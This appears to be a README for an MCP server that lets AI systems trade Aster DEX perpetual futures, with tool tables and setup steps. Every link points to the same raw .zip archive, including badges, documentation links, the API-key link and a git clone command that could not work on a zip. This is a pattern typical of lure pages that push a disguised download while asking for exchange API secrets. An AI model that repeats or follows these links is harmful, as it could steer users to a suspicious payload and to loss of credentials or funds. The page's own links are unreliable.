# asterdex-mcp-server

> **56-tool MCP server for Aster DEX perpetual futures trading**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-blue.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
[![Node.js](https://img.shields.io/badge/Node.js-20%2B-green.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue.svg)](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip)

A comprehensive [Model Context Protocol](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip) server that gives Claude (and any MCP-compatible AI) full access to Aster DEX perpetual futures — from real-time market data and institutional-grade analysis to live order execution and automated strategies.

## Why This Exists

Most DEX integrations are thin API wrappers. This server includes the analytical layer that makes the data actionable:

| Capability | This Server | Basic Wrappers |
|---|---|---|
| VPVR (Volume Profile) | POC, VAH, VAL, VWAP, Delta | — |
| Cross-Exchange Analysis | Aster vs Hyperliquid vs Binance | — |
| Pump / Breakout Detection | MFI, StochRSI, OBV, structural scoring | — |
| Market Regime Detection | BTC EMA/RSI regime with confidence band | — |
| Binance Flow Signals | OI history, top-trader positioning, taker flow | — |
| Accumulation Detection | Pre-move institutional signals | — |
| Strategy Automation | Funding farm, grid, pump strategies | — |
| Spot + Perps | Both markets, transfers between | — |
| QFL Base Signals | CryptoBaseScanner integration | — |
| Scale Grid Engine | Multi-level grid with risk management | — |

---

## Tools Reference (56 total)

### Market Data
| Tool | Description |
|---|---|
| `get_market_data` | Price, ticker, orderbook, funding rates, exchange info |
| `get_klines` | Historical candlestick data |
| `get_recent_trades` | Recent public trades |
| `scan_markets` | Scan all markets sorted by volume, funding, change, OI, or spread |
| `get_market_intelligence` | Comprehensive report: top gainers, losers, volume leaders, funding opportunities |

### Perpetual Trading
| Tool | Description |
|---|---|
| `execute_order` | Market/limit orders with TP/SL and trailing stops |
| `manage_orders` | Cancel orders, batch place, set auto-cancel timer |
| `calculate_position_size` | Risk-based position sizing from account balance |
| `panic_button` | Emergency close all positions and cancel all orders |

### Spot Trading
| Tool | Description |
|---|---|
| `get_spot_market_data` | Spot prices, tickers, orderbook, trading pairs |
| `get_spot_klines` | Spot candlestick data |
| `get_spot_trades` | Recent spot trades |
| `get_spot_account` | Balances, open orders, order history, trade history |
| `execute_spot_order` | Market buy/sell or limit orders |
| `cancel_spot_order` | Cancel single or all spot orders |
| `spot_transfer` | Transfer assets between spot and perpetuals wallet |

### Account & Risk
| Tool | Description |
|---|---|
| `get_account_info` | Balance, positions, orders, ADL risk, liquidation history, PnL, leverage brackets |
| `manage_credentials` | Set/clear API credentials at runtime |

### Volume Profile Analytics
| Tool | Description |
|---|---|
| `vpvr_analysis` | Full VPVR: POC, VAH, VAL, VWAP, delta, HVN/LVN nodes |
| `vpvr_cross` | Side-by-side VPVR comparison: Aster vs Hyperliquid |
| `deep_analysis` | VPVR + orderbook depth at key levels + BTC correlation + session context |
| `obv_analysis` | Multi-timeframe OBV trends and price/OBV divergences (5m/15m/1h/4h) |

### Scanners
| Tool | Description |
|---|---|
| `scan_for_pumps` | Early pump signals: volume spikes, MFI, StochRSI (Aster) |
| `scan_for_pumps_hl` | Same scan on Hyperliquid |
| `scan_for_pumps_cross` | Cross-exchange comparison — pairs flagged on both = highest conviction |
| `scan_breakouts` | Structural breakout detection with VPVR-based scoring |
| `scan_momentum` | Active momentum: coins already pumping or dumping with force |
| `scan_liquidity` | Trade tape analysis: liquidity health, bot patterns, tradeability scoring |
| `scan_oi_divergence` | OI vs price divergence: accumulation/distribution signals |

### Binance Intelligence
| Tool | Description |
|---|---|
| `get_market_regime` | BTC market regime: bullish/bearish/neutral with confidence score |
| `get_binance_sentiment` | Top trader L/S ratio, global L/S ratio, taker buy/sell volume |
| `get_binance_oi_history` | Open interest history — trend over time |
| `get_binance_funding` | Binance funding rates (compare with Aster for arbitrage) |
| `compare_exchange_volume` | Volume, price, OI comparison between Aster and Binance |
| `scan_exchange_divergence` | Find pairs where Binance and Aster diverge significantly |
| `scan_accumulation` | Pre-move institutional signals using OI velocity, funding, taker flow |
| `scan_funding_extremes` | Extreme funding rates — squeeze potential detection |
| `scan_binance_signals` | Primary scanner: institutional-grade signals using Binance as data oracle |

### QFL Base Signals (CryptoBaseScanner)
| Tool | Description |
|---|---|
| `get_cbs_signals` | Active QFL base cracks — prime buying opportunities |
| `get_cbs_markets` | Markets approaching their base level |
| `get_cbs_quick_scan` | Recent price drops (5-30 min) for fast moves |
| `compare_cbs_algorithms` | Compare original/day_trade/conservative/position algorithms for one symbol |

### Strategy Automation
| Tool | Description |
|---|---|
| `manage_strategy` | Control funding farm and grid trading strategies |
| `start_strategy` | Start the automated pump strategy engine |
| `stop_strategy` | Stop strategy with optional position close |
| `get_strategy_status` | Current strategy state and open positions |
| `update_strategy_config` | Modify parameters while running |
| `close_strategy_position` | Close a specific strategy-managed position |

### Scale Grid Engine
| Tool | Description |
|---|---|
| `grid_preview` | Preview grid levels before committing capital |
| `grid_start` | Start a scale grid with custom parameters |
| `grid_status` | Current grid state, levels, PnL |
| `grid_adjust` | Modify TP and risk parameters while running |
| `grid_pause` | Pause grid without closing positions |
| `grid_resume` | Resume a paused grid |
| `grid_close` | Close grid and optionally the underlying position |

### Infrastructure
| Tool | Description |
|---|---|
| `manage_stream` | WebSocket stream control (start, stop, status, collect events) |
| `manage_cache` | Cache management — scan, retrieve, clear, load |

---

## Installation

### Prerequisites

- Node.js 20+
- pnpm (`npm install -g pnpm`)
- Aster DEX account with API key ([get one here](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip))

### Clone and build

```bash
git clone https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip
cd asterdex-mcp-server
pnpm install
pnpm run build
```

### Configure credentials

```bash
cp .env.example .env
# Edit .env with your Aster API key and secret
```

---

## Setup with Claude

### Claude Desktop

Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "aster": {
      "command": "node",
      "args": ["/path/to/asterdex-mcp-server/dist/mcp-server.js"],
      "env": {
        "ASTER_API_KEY": "your_key",
        "ASTER_API_SECRET": "your_secret"
      }
    }
  }
}
```

### Claude Code (CLI)

```bash
claude mcp add aster -- node /path/to/asterdex-mcp-server/dist/mcp-server.js
```

Or add to `.mcp.json` in your project:

```json
{
  "mcpServers": {
    "aster": {
      "command": "node",
      "args": ["/path/to/asterdex-mcp-server/dist/mcp-server.js"],
      "env": {
        "ASTER_API_KEY": "your_key",
        "ASTER_API_SECRET": "your_secret"
      }
    }
  }
}
```

### OpenCode

Add to `~/.config/opencode/opencode.json`:

```json
{
  "mcp": {
    "aster": {
      "type": "local",
      "command": ["node", "/path/to/asterdex-mcp-server/dist/mcp-server.js"],
      "env": {
        "ASTER_API_KEY": "your_key",
        "ASTER_API_SECRET": "your_secret"
      }
    }
  }
}
```

---

## Usage Examples

Once connected, ask Claude naturally:

```
What's the current BTC funding rate on Aster vs Hyperliquid?

Run VPVR analysis on ETHUSDT and tell me the key support/resistance levels.

Scan for pump signals — show me the top 5 with highest conviction.

What's the current market regime? Should I be longing or shorting right now?

Open a 100 USDT long on SOL with 10x leverage and a 2.5% stop loss.

Where is institutional accumulation happening right now?

Start a funding farm strategy on the top 3 positive-funding pairs.

Compare Binance and Aster volume on ETHUSDT — which exchange is leading?
```

---

## Standalone Scripts

The `scripts/` folder contains CLI tools that run directly — no MCP server needed, no Claude required:

```bash
# Build first
pnpm run build

# Visual VPVR analysis with color output
node scripts/vpvr-analysis.mjs LINKUSDT

# Cross-exchange VPVR comparison (Aster vs Hyperliquid)
node scripts/vpvr-cross.mjs BTCUSDT

# In-depth VPVR analysis with extended metrics
node scripts/vpvr-analyzer.mjs ETHUSDT

# RSI-based ranging market detection across all pairs
node scripts/scan-ranging.mjs
```

### VPVR Output Example

```
ENHANCED VPVR: LINKUSDT

KEY LEVELS:
   Current: $14.0470
   POC:     $13.4613  (highest volume node)
   VWAP:    $13.7240  (volume-weighted avg)
   VA High: $13.8994
   VA Low:  $13.4307

POSITION: ABOVE VA (Bullish Breakout) · Above VWAP

DELTA (Buy/Sell Pressure):
   Buy:  $485k  |  Sell: $403k  |  Net: +$82k (9.2%) [WEAK]

VOLUME PROFILE:
   $ 14.1948 |
  +$ 14.1541 |##
  +$ 14.1133 |###
   $ 14.0726 |####
   $ 14.0318 |## > NOW
   $ 13.9911 |###
   $ 13.9503 |###
  +$ 13.9096 |#### <-- VAH
  ...
   $ 13.4613 |████████████████ POC
   ...
```

### Cross-Exchange VPVR Example

```
PRICE LEVELS COMPARISON
                    ASTER    HYPERLIQUID      DIFF
POC               90167.5       90163.9    +0.00%
VWAP              90856.4       91040.0    -0.20%
VA High           91523.0       91818.0
VA Low            89240.0       89229.0

DELTA ANALYSIS
Aster:       7.5%  BUYERS
Hyperliquid: 5.9%  BUYERS

VOLUME COMPARISON
Aster:       $4,670,814k
Hyperliquid: $41k
Ratio:       113,696x  (Aster leads)
```

---

## Environment Variables

| Variable | Required | Description |
|---|---|---|
| `ASTER_API_KEY` | For trading | Your Aster DEX API key |
| `ASTER_API_SECRET` | For trading | Your Aster DEX API secret |
| `CBS_API_KEY` | Optional | CryptoBaseScanner key for QFL signals |

Market data and analysis tools work without credentials. Trading and account tools require API keys.

---

## Attribution

Exchange API client originally adapted from [lugondev's aster-dex-api](https://raw.githubusercontent.com/Excaliber9271/asterdex-mcp-server/main/src/mcp_server_asterdex_2.2.zip) and significantly extended.

---

## Disclaimer

This software is for informational and educational purposes. Perpetual futures trading involves substantial risk of loss. Never risk capital you cannot afford to lose.

---

## License

MIT — see [LICENSE](LICENSE)
